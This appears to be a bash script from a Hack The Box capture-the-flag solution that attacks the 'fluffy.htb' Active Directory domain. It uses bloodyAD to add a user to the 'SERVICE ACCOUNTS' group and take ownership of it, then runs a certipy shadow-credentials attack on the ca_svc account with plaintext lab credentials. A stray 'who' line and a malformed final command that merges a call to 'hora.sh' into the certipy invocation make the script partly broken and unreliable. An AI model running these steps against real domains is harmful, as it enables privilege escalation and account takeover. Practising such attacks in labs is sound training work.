#!/bin/bash

set -x

TARGET="10.10.11.69"

# Add group
bloodyAD.py --host $TARGET -d 'fluffy.htb' \
	  -u 'p.agila' -p 'prometheusx-303' \
	  add groupMember 'SERVICE ACCOUNTS' 'p.agila' || true

# Set owner
bloodyAD.py --host $TARGET -d 'fluffy.htb' \
	  -u 'p.agila' -p 'prometheusx-303' \
	  set owner 'SERVICE ACCOUNTS' 'p.agila'
who
# Hack: Shadow credentials
bash hora.sh fluffy.htb \
certipy shadow auto \
	  -username 'p.agila@fluffy.htb' -password 'prometheusx-303' \
	  -account ca_svc
